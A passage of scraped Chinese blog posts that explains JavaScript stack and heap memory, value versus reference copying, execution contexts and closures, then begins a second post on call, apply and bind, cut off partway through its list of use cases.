<p>栈内存是 JS 执行的主角，用于维护函数调用过程中的<strong>执行上下文</strong>。它的特点是：</p>
<ul>
<li>空间小、速度快</li>
<li>连续存储，便于快速切换</li>
<li>每次函数调用都会创建一个执行上下文并压入栈顶</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = a<span class="hljs-comment">;</span>
  <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  console.log(a)<span class="hljs-comment">; // 2</span>
  console.log(b)<span class="hljs-comment">; // 1</span>
}
foo()<span class="hljs-comment">;</span>
</code></pre>
<p>这段代码执行时，<code>foo()</code> 被调用，会生成一个新的执行上下文，并压入调用栈。这个上下文包含变量 <code>a</code> 和 <code>b</code>，它们都是简单数据类型，直接存储在栈中。</p>
<h3 data-id="heading-3">3. 堆内存</h3>
<p>堆内存用来存储复杂数据类型，比如对象、数组等。这些数据体积大、结构复杂，并且是<strong>动态</strong>的，不能放在栈里，所以被分配到堆中。
它的特点是:</p>
<ul>
<li>'辅助栈内存'</li>
<li>空间大 不连续</li>
<li>存储复杂数据类型 对象</li>
</ul>

<pre><code class="hljs language-css" lang="css">function foo() {
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = { name: <span class="hljs-string">'极客时间'</span> };
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>; // 引用拷贝
  <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = '极客邦';
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // {name: <span class="hljs-string">"极客邦"</span>}
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // {name: <span class="hljs-string">"极客邦"</span>}
}
foo();
</code></pre>
<p>这里 <code>a</code> 是一个对象，它实际存储在堆内存中，而 <code>a</code> 变量只是保存了该对象的<strong>地址</strong>（引用）。<code>b = a</code> 并不是复制对象，而是让 <code>b</code> 也指向同一个地址。因此修改 <code>a.name</code> 后，<code>b</code> 也能看到变化。</p>
<h3 data-id="heading-4">为什么堆内存是不连续的?</h3>
<ul>
<li>因为对象是动态的 可以去给它添加属性或方法 如果是连续的情况下 显然就不好进行操作了</li>
</ul>
<hr/>
<h2 data-id="heading-5">二、简单 vs 复杂 数据类型：存储方式不同</h2>
<p>JavaScript 有八种原始数据类型：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-literal">undefined</span>, <span class="hljs-literal">null</span>, <span class="hljs-built_in">boolean</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>, <span class="hljs-built_in">symbol</span>, <span class="hljs-built_in">bigint</span>, <span class="hljs-built_in">object</span>
</code></pre>
<p>其中前七种是<strong>简单数据类型</strong>，最后一个是<strong>复杂数据类型</strong>。</p>

















<table><thead><tr><th>类型</th><th>存储位置</th></tr></thead><tbody><tr><td>简单类型（如 number, string）</td><td>栈内存</td></tr><tr><td>复杂类型（如 object, array）</td><td>堆内存</td></tr></tbody></table>
<h3 data-id="heading-6">示例说明</h3>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">a</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">; // 字符串 → 栈内存</span>
var <span class="hljs-attr">b</span> = a<span class="hljs-comment">;         // 拷贝值 → b 也是 '极客时间'</span>
<span class="hljs-attr">a</span> = <span class="hljs-string">'极客邦'</span><span class="hljs-comment">;      // 修改 a 不影响 b</span>
console.log(a)<span class="hljs-comment">; // 极客邦</span>
console.log(b)<span class="hljs-comment">; // 极客时间</span>
</code></pre>

<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">c</span> = { name: <span class="hljs-string">'极客时间'</span> }<span class="hljs-comment">; // 对象 → 堆内存</span>
var <span class="hljs-attr">d</span> = c<span class="hljs-comment">;                  // 引用拷贝 → d 指向同一地址</span>
<span class="hljs-attr">c.name</span> = <span class="hljs-string">'极客邦'</span><span class="hljs-comment">;          // 修改共享对象</span>
console.log(c.name)<span class="hljs-comment">; // 极客邦</span>
console.log(d.name)<span class="hljs-comment">; // 极客邦</span>
</code></pre>
<blockquote>
<p>✅ 结论：</p>
<ul>
<li>简单类型是“值传递”，每个变量独立存在</li>
<li>复杂类型是“引用传递”，多个变量可能指向同一块堆内存</li>
</ul>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6f7e375eb654499a97beeb426b4a68f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=kqCgSDiSKERtKdX%2BLWZvkWcFWWI%3D" alt="lQLPJxNqPKGZwofNAifNBHawc4pej93FtxkJEmmk8M9qAA_1142_551.png" loading="lazy"/></p>
<blockquote>
<p>图2：变量 <code>c</code> 存储的是堆内存中对象的地址（1003）</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">三、执行上下文与调用栈</h2>
<p>JavaScript 的执行流程依赖于<strong>调用栈</strong>（Call Stack），它是函数调用的“记录本”。</p>
<p>每当一个函数被执行，就会创建一个<strong>执行上下文</strong>（Execution Context），包括：</p>
<ul>
<li>变量环境（Variable Environment）</li>
<li>词法环境（Lexical Environment）</li>
<li>outer（外层作用域链）</li>
</ul>
<p>执行上下文会被压入调用栈顶部。当函数执行完毕后，该上下文就会被弹出并回收。</p>
<h3 data-id="heading-8">示例：函数调用前后</h3>
<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
}

foo()<span class="hljs-comment">; // 调用 foo</span>
</code></pre>
<p>执行过程如下：</p>
<ol>
<li>创建全局执行上下文（已存在）</li>
<li>调用 <code>foo()</code>，创建新的执行上下文，压入调用栈</li>
<li>执行完 <code>foo()</code>，将其执行上下文弹出，指针回到全局上下文</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78eb34e7e6094e3697a8b1553b6e9150~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=6BHV7cDi%2B0wgwPaNqiLJM2oJcSE%3D" alt="lQLPJw1WF0yif-fNAhTNBHawwsioxubOAzAJEmTtM6BTAA_1142_532.png" loading="lazy"/></p>
<blockquote>
<p>图3：<code>foo()</code> 执行前后调用栈的变化</p>
</blockquote>
<p>注意：<strong>栈顶指针移动非常快</strong>，因为栈是连续内存，只需要改变指针位置即可完成上下文切换(栈顶指针的切换通过一个机制，做内存的减法)。如果将复杂对象也放在栈中，会导致栈空间过大、不连续，严重影响性能。</p>
<hr/>
<h2 data-id="heading-9">四、动态弱类型语言：JS 的灵活性</h2>
<p>JavaScript 是一种<strong>动态弱类型语言</strong>，这意味着：</p>
<ul>
<li><strong>动态</strong>：变量可以在运行时改变类型</li>
<li><strong>弱类型</strong>：不同类型之间可以自动转换</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">var bar<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // undefined</span>

<span class="hljs-attr">bar</span> = <span class="hljs-number">12</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // number</span>

<span class="hljs-attr">bar</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // string</span>

<span class="hljs-attr">bar</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // boolean</span>

<span class="hljs-attr">bar</span> = null<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // object（JS 设计缺陷）</span>

<span class="hljs-attr">bar</span> = { name: <span class="hljs-string">'极客时间'</span> }<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // object</span>
</code></pre>
<p>这正是 JS 的魅力所在：无需提前声明类型，灵活自由。但这也带来了潜在问题，比如 <code>typeof null === 'object'</code> 就是一个经典 bug。</p>
<hr/>
<h2 data-id="heading-10">五、闭包的本质：延长变量生命周期</h2>
<p>现在我们来看一个关键概念——<strong>闭包</strong>。</p>
<h3 data-id="heading-11">什么是闭包？</h3>
<p>闭包是指：<strong>内部函数能够访问外部函数的变量</strong>，即使外部函数已经执行完毕。</p>
<pre><code class="hljs language-ini" lang="ini">&lt;script&gt;
function foo() {
  var <span class="hljs-attr">myName</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;</span>
  let <span class="hljs-attr">test1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  const <span class="hljs-attr">test2</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>

  var <span class="hljs-attr">innerBar</span> = {
    setName: function (newName) {
      <span class="hljs-attr">myName</span> = newName<span class="hljs-comment">;</span>
    },
    getName: function () {
      console.log(test1)<span class="hljs-comment">;</span>
      return myName<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  return innerBar<span class="hljs-comment">;</span>
}

var <span class="hljs-attr">bar</span> = foo()<span class="hljs-comment">;</span>
bar.setName("极客邦")<span class="hljs-comment">;</span>
bar.getName()<span class="hljs-comment">; // 输出：1, 极客邦</span>
&lt;/script&gt;
</code></pre>
<p>在这个例子中，<code>innerBar</code> 返回了一个对象，其方法 <code>setName</code> 和 <code>getName</code> 都能访问 <code>myName</code> 和 <code>test1</code>。但 <code>foo()</code> 已经执行完了，按理说这些变量应该被销毁了，为什么还能访问？</p>
<p>这就是<strong>闭包</strong>的作用！</p>
<hr/>
<h2 data-id="heading-12">六、闭包背后的内存机制</h2>
<p>闭包是如何工作的？答案就在<strong>堆内存</strong>中。</p>
<h3 data-id="heading-13">步骤解析：</h3>
<ol>
<li>当 <code>foo()</code> 被调用时，V8 引擎会扫描内部函数 <code>setName</code> 和 <code>getName</code></li>
<li>发现这两个函数引用了外部变量 <code>myName</code> 和 <code>test1</code></li>
<li>引擎判断：这是一个闭包！需要保留这些变量</li>
<li>在<strong>堆内存</strong>中创建一个特殊的对象：<code>closure(foo)</code></li>
<li>把 <code>myName</code> 和 <code>test1</code> 的值保存到这个对象中</li>
<li>将 <code>closure(foo)</code> 的地址存入栈中（作为 <code>innerBar</code> 的一部分）</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4133aef40636482a83b6dc09b9d2fe69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=bP9RGYy1EHtgKgfS7b3xvF8Lup0%3D" alt="lQLPJxNqPKGZwofNAifNBHawc4pej93FtxkJEmmk8M9qAA_1142_551.png" loading="lazy"/></p>
<blockquote>
<p>图4：闭包 <code>closure(foo)</code> 存储在堆内存中，栈中只保存地址</p>
</blockquote>
<h3 data-id="heading-14">关键点总结：</h3>
<ul>
<li><strong>闭包本质</strong>：通过堆内存延长了外部变量的生命周期</li>
<li><strong>栈中保存的是地址</strong>，堆中保存的是真实数据</li>
<li><strong>执行上下文出栈 ≠ 变量消失</strong>，只要还有引用，就继续存活</li>
</ul>
<hr/>
<h2 data-id="heading-15">七、为什么 JS 不需要手动管理内存？</h2>
<p>像 C/C++ 这样的语言，开发者必须使用 <code>malloc</code> 和 <code>free</code> 来手动分配和释放内存：</p>
<pre><code class="hljs language-ini" lang="ini">int main(){
  int <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  char* <span class="hljs-attr">b</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">;</span>
  bool <span class="hljs-attr">c</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>

  <span class="hljs-attr">c</span> = a<span class="hljs-comment">;</span>
  return 0<span class="hljs-comment">;</span>
}
</code></pre>
<p>而在 JavaScript 中，你完全不需要关心这些。<strong>V8 引擎自动完成内存分配和垃圾回收</strong>。</p>
<ul>
<li>栈内存：执行上下文结束 → 自动弹出 → 快速回收</li>
<li>堆内存：没有变量引用的对象 → 垃圾回收器（GC）定期清理</li>
</ul>
<blockquote>
<p>✅ 所以 JS 开发者可以专注于业务逻辑，而不必担心内存泄漏（虽然也要注意，比如事件监听器未解绑可能导致内存泄漏）</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">八、总结：JS 内存机制核心要点</h2>

































<table><thead><tr><th>内容</th><th>说明</th></tr></thead><tbody><tr><td><strong>栈内存</strong></td><td>调用栈在其内部，存放执行上下文、简单数据类型，速度快，连续</td></tr><tr><td><strong>堆内存</strong></td><td>存放复杂对象，空间大，不连续</td></tr><tr><td><strong>变量提升</strong></td><td>编译阶段为变量预留空间，初始值为 <code>undefined</code></td></tr><tr><td><strong>引用传递</strong></td><td>对象赋值是地址拷贝，多个变量共享同一对象</td></tr><tr><td><strong>闭包</strong></td><td>内部函数引用外部变量 → 堆内存保存自由变量 → 延长生命周期</td></tr><tr><td><strong>栈顶指针</strong></td><td>函数调用时移动，上下文切换高效</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">九、写在最后</h2>
<p>理解 JavaScript 的内存机制，不仅能帮助我们写出更高效的代码，还能更好地掌握闭包、作用域、垃圾回收等高级概念。虽然我们不需要像 C++ 那样手动操作内存，但了解背后的原理，会让你的代码更加稳健。</p>
<blockquote>
<p>💡 提醒：不要滥用闭包，因为它会让变量长期驻留内存，增加 GC 压力。合理使用，才是高手之道。</p>
</blockquote>
<hr/>
<p>📌 如果你觉得这篇文章对你有帮助，欢迎点赞、收藏、转发！关注我，带你深入浅出地学透前端技术！</p>
<blockquote>
<p>📸 图片来源：本文所有图片均为原创示意图，用于辅助理解 JS 内存模型。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript call、apply、bind 方法解析]]></title>    <link>https://juejin.cn/post/7581844141668057128</link>    <guid>https://juejin.cn/post/7581844141668057128</guid>    <pubDate>2025-12-10T03:42:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581844141668057128" data-draft-id="7581870491763114036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript call、apply、bind 方法解析"/> <meta itemprop="keywords" content="JavaScript,前端,面试"/> <meta itemprop="datePublished" content="2025-12-10T03:42:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我叫黑大帅"/> <meta itemprop="url" content="https://juejin.cn/user/1678295463898875"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript call、apply、bind 方法解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1678295463898875/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我叫黑大帅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:42:06.000Z" title="Wed Dec 10 2025 03:42:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript call、apply、bind 方法解析</h2>
<p>在 JavaScript 中，<code>call</code>、<code>apply</code>、<code>bind</code> 都是用来**<code>this</code>** <strong>改变函数执行时  指向</strong> 的核心方法，它们的核心目标一致，但使用方式、执行时机和传参形式有明显区别。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> dog = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"旺财"</span>,
  <span class="hljs-title function_">sayName</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-title function_">eat</span>(<span class="hljs-params">food</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 在吃<span class="hljs-subst">${food}</span>`</span>);
  },
  <span class="hljs-title function_">eats</span>(<span class="hljs-params">food1, food2</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> 在吃<span class="hljs-subst">${food1}</span>和<span class="hljs-subst">${food2}</span>`</span>);
  },
};

<span class="hljs-keyword">const</span> cat = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"咪咪"</span>,
};
<span class="hljs-comment">// call 会立即执行函数，并且改变 this 指向</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">call</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>
dog.<span class="hljs-property">eat</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟'</span>

dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">apply</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>

dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">apply</span>(cat, [<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>]); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>

<span class="hljs-keyword">const</span> boundEats = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat);
<span class="hljs-title function_">boundEats</span>(<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h3 data-id="heading-1">一、核心共性</h3>
<p>三者的核心作用：<strong><code>this</code></strong> <strong>手动指定函数执行时的  指向</strong>，突破函数默认的 <code>this</code> 绑定规则（比如对象方法的 <code>this</code> 原本指向对象本身，通过这三个方法可以强制指向其他对象）。</p>
<p>以示例中的 <code>dog.sayName()</code> 为例，默认执行时 <code>this</code> 指向 <code>dog</code>，但通过 <code>call/apply/bind</code> 可以让 <code>this</code> 指向 <code>cat</code>，从而输出 <code>咪咪</code> 而非 <code>旺财</code>。</p>
<h3 data-id="heading-2">二、逐个解析</h3>
<h4 data-id="heading-3">1. call</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>立即执行</strong> 函数</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数<strong>逐个单独传递</strong>（逗号分隔）</p>
</li>
<li>
<p><strong>语法</strong>：<code>函数.call(thisArg, arg1, arg2, ...)</code></p>
</li>
</ul>
<h5 data-id="heading-4">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// this 指向 cat，无额外参数，立即执行 sayName</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">call</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

<span class="hljs-comment">// this 指向 cat，额外参数 '🐟' 逐个传递，立即执行 eat</span>
dog.<span class="hljs-property">eat</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟'</span>

<span class="hljs-comment">// 多参数场景：参数逐个传递，立即执行 eats</span>
dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">call</span>(cat, <span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h4 data-id="heading-5">2. apply</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>立即执行</strong> 函数（和 <code>call</code> 一致）</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数<strong>必须放在一个数组（或类数组）中传递</strong></p>
</li>
<li>
<p><strong>语法</strong>：<code>函数.apply(thisArg, [arg1, arg2, ...])</code></p>
</li>
</ul>
<h5 data-id="heading-6">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 无额外参数，数组可以为空（或不传），立即执行 sayName</span>
dog.<span class="hljs-property">sayName</span>.<span class="hljs-title function_">apply</span>(cat); <span class="hljs-comment">// 输出 '咪咪'</span>

<span class="hljs-comment">// 多参数场景：参数放在数组中传递，立即执行 eats</span>
dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">apply</span>(cat, [<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>]); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<p>注意：<code>apply</code> 适合参数数量不固定、或参数已存在于数组中的场景（比如 <code>Math.max.apply(null, [1,2,3])</code> 求数组最大值）。</p>
<h4 data-id="heading-7">3. bind</h4>
<ul>
<li>
<p><strong>执行时机</strong>：<strong>不立即执行</strong> 函数，而是返回一个<strong>绑定了新 this 指向的新函数</strong>，后续需要手动调用这个新函数才会执行</p>
</li>
<li>
<p><strong>传参方式</strong>：第一个参数是 <code>this</code> 要指向的目标对象，后续参数可以<strong>提前绑定（柯里化）</strong>，也可以在调用新函数时补充</p>
</li>
<li>
<p><strong>语法</strong>：<code>const 新函数 = 函数.bind(thisArg, arg1, arg2, ...); 新函数(剩余参数);</code></p>
</li>
</ul>
<h5 data-id="heading-8">示例解析：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 第一步：bind 不执行，仅绑定 this 为 cat，返回新函数 boundEats（原变量名 boundSayName 已修改）</span>
<span class="hljs-keyword">const</span> boundEats = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat);

<span class="hljs-comment">// 第二步：手动调用新函数，传递参数 '🐟' 和 '🐔'，此时才执行 eats</span>
<span class="hljs-title function_">boundEats</span>(<span class="hljs-string">"🐟"</span>, <span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h5 data-id="heading-9">进阶用法：</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 提前绑定部分参数（柯里化），this 仍指向 cat</span>
<span class="hljs-keyword">const</span> boundEatWithFish = dog.<span class="hljs-property">eats</span>.<span class="hljs-title function_">bind</span>(cat, <span class="hljs-string">"🐟"</span>);
<span class="hljs-comment">// 调用时补充剩余参数，同样输出目标结果</span>
<span class="hljs-title function_">boundEatWithFish</span>(<span class="hljs-string">"🐔"</span>); <span class="hljs-comment">// 输出 '咪咪 在吃🐟和🐔'</span>
</code></pre>
<h3 data-id="heading-10">三、核心区别总结</h3>





























<table><thead><tr><th>特性</th><th>call</th><th>apply</th><th>bind</th></tr></thead><tbody><tr><td>执行时机</td><td>立即执行</td><td>立即执行</td><td>不立即执行，返回新函数</td></tr><tr><td>传参形式</td><td>逐个传递（逗号分隔）</td><td>数组/类数组传递</td><td>可提前绑定，也可调用时传</td></tr><tr><td>返回值</td><td>函数执行结果</td><td>函数执行结果</td><td>绑定 this 后的新函数</td></tr></tbody></table>
<h3 data-id="heading-11">四、常见使用场景</h3>
<ol>
<li>
